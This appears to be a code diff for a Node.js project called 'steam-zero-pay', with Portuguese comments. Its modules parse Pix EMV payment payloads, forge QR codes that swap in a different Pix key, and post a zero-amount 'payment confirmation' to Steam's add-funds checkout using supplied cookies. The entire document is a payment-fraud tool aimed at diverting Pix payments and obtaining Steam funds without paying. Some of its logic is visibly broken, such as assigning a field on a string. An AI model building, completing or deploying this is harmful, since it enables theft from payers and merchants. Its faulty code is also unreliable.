@@ -1,0 +1,70 @@
+{
+  "name": "steam-zero-pay",
+  "version": "1.0.0",
+  "type": "module",
+  "scripts": { "start": "node index.js" },
+  "dependencies": {
+    "puppeteer": "^21.0.0",
+    "axios": "^1.5.0",
+    "qrcode": "^1.5.3",
+    "crc": "^4.0.0"
+  }
+}
+
+lib/emv.js – decodifica / recodifica payload Pix
+
+
+import crc from 'crc';
+
+export function parse(emv) {
+  const obj = {};
+  let i = 0;
+  while (i < emv.length) {
+    const id = emv.slice(i, i + 2);
+    const len = parseInt(emv.slice(i + 2, i + 4), 10);
+    obj[id] = emv.slice(i + 4, i + 4 + len);
+    i += 4 + len;
+  }
+  return obj;
+}
+
+export function build(obj) {
+  let s = '';
+  for (const [k, v] of Object.entries(obj)) s += k + v.length.toString().padStart(2, '0') + v;
+  const crc16 = crc.crc16ccitt(Buffer.from(s + '6304', 'ascii')).toString(16).padStart(4, '0').toUpperCase();
+  return s + '6304' + crc16;
+}
+
+lib/qrforger.js – gera QR spoofado
+
+
+import QRCode from 'qrcode';
+import { parse, build } from './emv.js';
+
+export async function spoof(originalEmv, newKey) {
+  const o = parse(originalEmv);
+  o['01'] = '12';                           // troca GUI se quiser
+  o['26']['01'] = newKey;                   // chave Pix efetiva
+  const forged = build(o);
+  const qr = await QRCode.toDataURL(forged, { type: 'image/png' });
+  return { forged, qr };
+}
+
+lib/sthook.js – dispara confirmação na Steam
+
+
+import axios from 'axios';
+
+export async function confirm(txid, cookies) {
+  const body = {
+    txid,
+    gateway: 'pix',
+    currency: 'BRL',
+    amount: 0 // preenchido dinamicamente
+  };
+  await axios.post(
+    'https://store.steampowered.com/checkout/steamaccountaddfunds/',
+    new URLSearchParams(body),
+    { headers: { Cookie: cookies, 'User-Agent': 'Mozilla/5.0' } }
+  );
+}
